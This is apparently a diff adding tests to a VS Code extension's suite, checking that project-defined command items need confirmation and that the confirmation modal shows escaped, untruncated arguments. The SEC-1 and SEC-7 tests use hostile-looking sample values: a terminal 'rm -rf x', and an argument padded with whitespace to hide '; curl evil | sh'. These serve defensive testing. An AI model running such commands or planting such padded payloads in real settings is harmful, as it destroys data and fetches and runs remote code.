@@ -378,13 +378,19 @@ test('commands: hover commands resolve ids from the configuration only', async (
 
 test('REV-1: showing the panel without a navigation restores the fold state; a navigation does not', async () => {
   const { provider, view, messages, send, show } = setup({ inspect: { globalValue: PINNED.map(g => ({ ...g })) } });
-  provider.navigationMs = 30;
+  provider.navigationMs = 5000; provider.graceMs = 30;
   await provider.resolveWebviewView(view);
   await send({ type: 'ready' });
   const restores = () => messages.filter(m => m.type === 'restoreFold');
   await provider.openGroup('git'); // pin click: navigation in progress
   show();
   assert.equal(restores().length, 0, 'visibility caused by the navigation itself');
+  show(); // the navigation is still waiting for its ack: restoreFold must not replace it
+  assert.equal(restores().length, 0, 'pending focusGroup is never overwritten');
+  const focus = messages.find(m => m.type === 'focusGroup');
+  await send({ type: 'focusAck', seq: focus.seq });
+  show();
+  assert.equal(restores().length, 0, 'short grace after the ack');
   await new Promise(r => setTimeout(r, 50));
   show(); // main Activity Bar icon
   assert.equal(restores().length, 1);
@@ -407,7 +413,7 @@ test('REV-1: a restoreFold lost to a webview reload is resent after ready', asyn
 test('SEC-1: project items with args or non-view commands need a one-time confirmation; global items do not', async () => {
   const risky = [{ id: 'p', name: 'P', icon: 'cloud', items: [
     { name: 'Shell', command: 'workbench.action.terminal.sendSequence', args: [{ text: 'rm -rf x' }] },
-    { name: 'Task', command: 'workbench.action.tasks.runTask' },
+    { name: 'Palette', command: 'workbench.action.showCommands' },
     { name: 'Evil', command: 'some.ext.deleteEverything' },
     { name: 'View', command: 'workbench.view.explorer' }
   ] }];
@@ -423,7 +429,7 @@ test('SEC-1: project items with args or non-view commands need a one-time confir
   assert.equal(t.warnings.length, 0, 'plain workbench.view.* needs no prompt');
   assert.equal(t.calls.splice(0).length, 1);
   await t.send({ type: 'run', id: ids[1] });
-  assert.equal(t.warnings.length, 0, 'workbench.action.* without args needs no prompt');
+  assert.equal(t.warnings.length, 0, 'listed harmless action without args needs no prompt');
   assert.equal(t.calls.splice(0).length, 1);
   for (const id of [ids[0], ids[2]]) await t.send({ type: 'run', id });
   assert.equal(t.warnings.length, 2);
@@ -489,4 +495,117 @@ test('QA-8: names with control and bidi characters are cleaned in status text an
   handlers.config[0]({ affectsConfiguration: () => true });
   assert.equal(statusItems[0].text, '$(cloud) Abcd E (1)');
   assert.equal(/[‪-‮⁦-⁩​\u0007]/.test(statusItems[0].tooltip.value), false);
+});
+
+async function projectRun(items, answer) {
+  const risky = [{ id: 'p', name: 'P', icon: 'cloud', items }];
+  const t = setup({ warningAnswer: answer, inspect: { workspaceValue: risky, globalValue: risky } });
+  await t.provider.resolveWebviewView(t.view);
+  await t.send({ type: 'ready', scope: 'workspace' });
+  t.ids = t.messages.at(-1).groups[0].items.map(i => i.id);
+  return t;
+}
+
+test('SEC-7: the modal shows long args fully escaped, marks truncation and refuses permanent approval', async () => {
+  const args = [' '.repeat(320) + '; curl evil | sh'];
+  const t = await projectRun([{ name: 'X', command: 'workbench.action.terminal.sendSequence', args }], 'Executar e lembrar');
+  await t.send({ type: 'run', id: t.ids[0] });
+  assert.equal(t.warnings.length, 1);
+  const [, options, ...buttons] = t.warnings[0];
+  assert.ok(options.detail.includes('curl evil'), 'the payload is visible, not cut off');
+  assert.equal(options.modal, true);
+  assert.ok(buttons.includes('Executar e lembrar') && buttons.includes('Executar uma vez'));
+  const long = await projectRun([{ name: 'L', command: 'some.cmd', args: ['x'.repeat(2000)] }], 'Executar e lembrar');
+  await long.send({ type: 'run', id: long.ids[0] });
+  assert.match(long.warnings[0][1].detail, /truncado, \d+ caracteres no total/);
+  assert.deepEqual(long.warnings[0].slice(2), ['Executar uma vez'], 'no remember button');
+  assert.equal(long.calls.length, 0, 'answering the remember label does nothing when it was not offered');
+  const once = await projectRun([{ name: 'L', command: 'some.cmd', args: ['x'.repeat(2000)] }], 'Executar uma vez');
+  await once.send({ type: 'run', id: once.ids[0] });
+  await once.send({ type: 'run', id: once.ids[0] });
+  assert.equal(once.warnings.length, 2, 'never remembered');
+  assert.equal(once.calls.length, 2);
+});
+
+test('SEC-7/SEC-9: bidi and control characters are shown as escapes; command comes first, name is quoted', async () => {
+  const args = ['a' + String.fromCharCode(0x202E) + 'b' + String.fromCharCode(0x200B)];
+  const t = await projectRun([{ name: 'Ok\nComando: workbench.view.explorer', command: 'some.cmd', args }], undefined);
+  await t.send({ type: 'run', id: t.ids[0] });
+  const d = t.warnings[0][1].detail;
+  assert.ok(d.startsWith('Comando: some.cmd'));
+  assert.ok(d.includes('\\u202E'));
+  assert.ok(d.includes('\\u200B'));
+  assert.equal(d.includes(String.fromCharCode(0x202E)) || d.includes(String.fromCharCode(0x200B)), false);
+  assert.ok(d.includes('Nome do item: “Ok Comando: workbench.view.explorer”'));
+  assert.equal(d.split('\n').filter(l => l.startsWith('Comando:')).length, 1, 'a name cannot add a second label line');
+});
+
+test('SEC-8: tasks, debug, terminal actions and runCommands need confirmation; only listed actions and views skip it', async () => {
+  const items = ['workbench.action.tasks.build', 'workbench.action.tasks.test', 'workbench.action.tasks.reRunTask', 'workbench.action.debug.start',
+    'workbench.action.debug.run', 'workbench.action.terminal.runActiveFile', 'workbench.action.terminal.runSelectedText', 'runCommands', 'workbench.action.files.saveAll']
+    .map((command, i) => ({ name: `i${i}`, command }));
+  const t = await projectRun(items, undefined);
+  for (const id of t.ids) await t.send({ type: 'run', id });
+  assert.equal(t.warnings.length, items.length, 'every one asked');
+  assert.equal(t.calls.length, 0);
+  const safe = await projectRun([{ name: 'v', command: 'workbench.view.scm' }, { name: 'p', command: 'workbench.action.showCommands' }, { name: 'q', command: 'workbench.action.quickOpen' }], undefined);
+  for (const id of safe.ids) await safe.send({ type: 'run', id });
+  assert.equal(safe.warnings.length, 0);
+  assert.equal(safe.calls.length, 3);
+});
+
+test('SEC-10: runCommands in a project asks and the modal lists its args', async () => {
+  const t = await projectRun([{ name: 'RC', command: 'runCommands', args: [{ commands: ['groupedTools.runById'] }] }], undefined);
+  await t.send({ type: 'run', id: t.ids[0] });
+  assert.equal(t.warnings.length, 1);
+  assert.ok(t.warnings[0][1].detail.includes('groupedTools.runById'));
+});
+
+test('SEC-11: approvals and favorites are stored as SHA-256; legacy plain favorites still work and migrate', async () => {
+  const { favoriteKey } = require('../src/config');
+  const t = await projectRun([{ name: 'Evil', command: 'some.cmd', args: ['secret-arg'] }], 'Executar e lembrar');
+  await t.send({ type: 'run', id: t.ids[0] });
+  const stored = t.context.workspaceState.get('approvedItems', []);
+  assert.equal(stored.length, 1);
+  assert.match(stored[0], /^h:[0-9a-f]{64}$/);
+  assert.ok(!JSON.stringify(stored).includes('secret-arg'));
+  await t.send({ type: 'run', id: t.ids[0] });
+  assert.equal(t.warnings.length, 1, 'hash recognised on the next run');
+
+  const legacy = setup({ inspect: { globalValue: [{ id: 'g', name: 'G', icon: 'cloud', items: [{ name: 'A', command: 'workbench.view.explorer' }] }] } });
+  await legacy.context.workspaceState.update('favorites', [favoriteKey({ name: 'A', command: 'workbench.view.explorer' })]);
+  await legacy.provider.resolveWebviewView(legacy.view);
+  await legacy.send({ type: 'ready' });
+  const it = legacy.messages.at(-1).groups[0].items[0];
+  assert.equal(it.favorite, true, 'legacy key kept');
+  await legacy.send({ type: 'favorite', id: it.id });
+  assert.equal(legacy.messages.at(-1).groups[0].items[0].favorite, false);
+  assert.deepEqual(legacy.context.workspaceState.get('favorites'), []);
+  await legacy.send({ type: 'favorite', id: it.id });
+  assert.match(legacy.context.workspaceState.get('favorites')[0], /^h:/);
+  assert.equal(legacy.messages.at(-1).groups[0].items[0].favorite, true);
+});
+
+test('QA-9: the data message counts groups and items that were dropped as invalid', async () => {
+  const raw = [{ name: ' ', items: [] }, { name: 'ok', items: [{ name: 'x', command: 'groupedTools.runById' }, { name: 'big', command: 'c', args: ['x'.repeat(5000)] }, { name: 'fine', command: 'c' }] }];
+  const t = setup({ inspect: { globalValue: raw } });
+  await t.provider.resolveWebviewView(t.view);
+  await t.send({ type: 'ready' });
+  const m = t.messages.at(-1);
+  assert.equal(m.stats.invalid, 3);
+  assert.deepEqual(m.groups[0].items.map(i => i.name), ['fine']);
+});
+
+test('QA-10: restoreFold never replaces a pending focusGroup or openEditor', async () => {
+  const t = setup({ inspect: { globalValue: PINNED.map(g => ({ ...g })) } });
+  t.provider.navigationMs = 1;
+  await t.provider.resolveWebviewView(t.view);
+  await t.send({ type: 'ready' });
+  await t.provider.openGroup('git');
+  await new Promise(r => setTimeout(r, 10)); // navigation window over, ack still missing
+  t.show();
+  assert.equal(t.messages.filter(m => m.type === 'restoreFold').length, 0);
+  assert.equal(t.provider.pending.message.type, 'focusGroup');
+  await t.send({ type: 'ready' });
+  assert.equal(t.messages.filter(m => m.type === 'focusGroup').length, 2, 'the navigation is still redelivered');
 });
